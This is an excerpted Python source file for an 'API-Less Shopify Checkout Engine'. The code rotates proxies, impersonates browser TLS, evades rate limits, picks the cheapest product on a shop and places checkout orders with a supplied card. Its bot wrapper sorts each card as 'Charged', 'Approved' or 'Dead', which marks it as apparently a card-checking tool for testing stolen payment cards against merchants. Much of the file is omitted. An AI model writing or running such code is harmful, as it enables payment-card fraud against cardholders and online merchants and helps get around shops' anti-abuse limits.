# =============================================================================
# checkout_engine.py — API-Less Shopify Checkout Engine (v2.4.1)
# =============================================================================
...
#   - All silent exceptions logged at debug level
...
#
# v2.3.1:
#   - fixed missing newline between `pass` and `patterns`
#     in extract_delivery_handle() that caused SyntaxError.
# =============================================================================
...
# v2.4.1: lowered from 8 to 4 to avoid Shopify per-IP rate limits on /products.json
...
_PROXY_HEALTH_TTL_LIVE = 300     # 5 min
_PROXY_HEALTH_TTL_DEAD = 60      # 1 min


def is_proxy_alive(proxy_url: str, timeout: float = 6.0) -> bool:
    """
    Public helper: returns True if the proxy can reach Shopify CDN over TLS
    using curl_cffi's browser impersonation. Cached per proxy:
      - live proxies:  5-minute TTL
      - dead proxies:  1-minute TTL
    Empty proxy → True (direct connection assumed reachable).
    """
    if not proxy_url:
        return True
    now = time.time()
...
def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0.50,
    ...
    # v2.4.1: 4 attempts instead of 3
    for attempt in range(1, 5):
        try:
            resp = client.get(url)
        except Exception as exc:
            last_err = exc
            logger.warning("find_cheapest_product attempt %d/4 network error: %r", attempt, exc)
            if attempt < 4:
        ...
        if resp.status_code == 429:
            ...
            try:
                # v2.4.1: 15-20s base backoff instead of 5-8s
                wait = int(ra) if ra and str(ra).isdigit() else 15 + random.random() * 5
            except Exception:
                wait = 15 + random.random() * 5
            wait = min(wait, 60) + random.random()
            logger.warning("find_cheapest_product attempt %d/4: HTTP 429, sleeping %.1fs", attempt, wait)
        ...
        if resp.status_code in _RETRYABLE:
            ...
            logger.warning("find_cheapest_product attempt %d/4: HTTP %s", attempt, resp.status_code)
            if attempt < 4:
                time.sleep(2 + random.random() * 3)
            continue
...
def extract_poll_for_receipt_id(js_body: str) -> str:
    ...
    Returns the 64-char hex operation ID for PollForReceipt, or "".
    """
    patterns = [
        # ── original set ──
        ...
        r'PollForReceipt[^\n]{0,400}?([a-f0-9]{32,64})',
        # ── v2.4.1 aggressive patterns ──
        r'"(?:id|queryId|persistedQueryId)"\s*:\s*"([a-f0-9]{64})"[^{}]{0,200}?PollForReceipt',
        r'PollForReceipt[^{}]{0,500}?"(?:id|queryId|persistedQueryId)"\s*:\s*"([a-f0-9]{64})"',
        r'"(?:name|operationName)"\s*:\s*"PollForReceipt"[^{}]{0,500}?"(?:id|queryId)"\s*:\s*"([a-f0-9]{64})"',
        r'"(?:id|queryId)"\s*:\s*"([a-f0-9]{64})"[^{}]{0,500}?"(?:name|operationName)"\s*:\s*"PollForReceipt"',
        r'PollForReceipt(?:[^a-f0-9]{0,100})([a-f0-9]{64})',
    ]
    for p in patterns:
        try:
    ...
    # ── v2.4.1 ULTIMATE fallback: scan ±500 chars around every "PollForReceipt" ──
    try:
        for m in re.finditer(r'PollForReceipt', js_body):
            start = max(0, m.start() - 500)
            end = min(len(js_body), m.end() + 500)
            chunk = js_body[start:end]
            hex_matches = re.findall(r'[a-f0-9]{64}', chunk)
            if hex_matches:
                logger.info("PollForReceipt found via fallback chunk: %s…", hex_matches[0][:16])
...
def run_checkout_public(shop_url: str, card: str, proxy_url: str = "", low: bool = True):
    """
    Bot-friendly dict wrapper around run_checkout_for_card().

    Signature (positional, matching bot.py's call):
        run_checkout_public(site, card, proxy_url, low)

    Returns a dict with:
        status       : 'Charged' | 'Approved' | 'Dead' | 'Error'
        message      : human-readable reason
        card, site   : echoed inputs
        gateway      : always 'Shopify'
        price        : string like '3.50' or '-'
        price_value  : float like 3.50 or 0.0
        proxy        : echoed proxy
        status_code  : e.g. 'ORDER_PLACED', 'CARD_DECLINED', 'PROXY_DEAD'
        retryable    : bool
        currency     : e.g. 'USD'
        receipt_url  : order URL when available
    """
    try:
    ...
    if name == 'CHARGED':
        return {'status': 'Charged', 'message': res.status_code or 'ORDER_PLACED',
                'card': card, 'site': shop_url, 'gateway': 'Shopify',
                'price': price, 'price_value': price_value,
                'proxy': proxy_url, 'status_code': 'ORDER_PLACED',
                'retryable': False,
                'currency': res.currency or 'USD',
                'receipt_url': res.receipt_url or ''}
    if name == 'APPROVED':
        return {'status': 'Approved', 'message': res.status_code or 'APPROVED',
                'card': card, 'site': shop_url, 'gateway': 'Shopify',
                'price': price, 'price_value': price_value,
                'proxy': proxy_url,
                ...
                'receipt_url': res.receipt_url or ''}
    if name == 'DECLINED':
        return {'status': 'Dead', 'message': res.status_code or 'CARD_DECLINED',
                'card': card, 'site': shop_url, 'gateway': 'Shopify',
                'price': price, 'price_value': price_value,
                'proxy': proxy_url,
                ...
                'currency': res.currency or 'USD',
                'receipt_url': res.receipt_url or ''}
    return {'status': 'Error', 'message': str(res.error or 'error')[:150],
            'card': card, 'site': shop_url, 'gateway': 'Shopify',
            'price': '-', 'price_value': 0.0,
            'proxy': proxy_url,
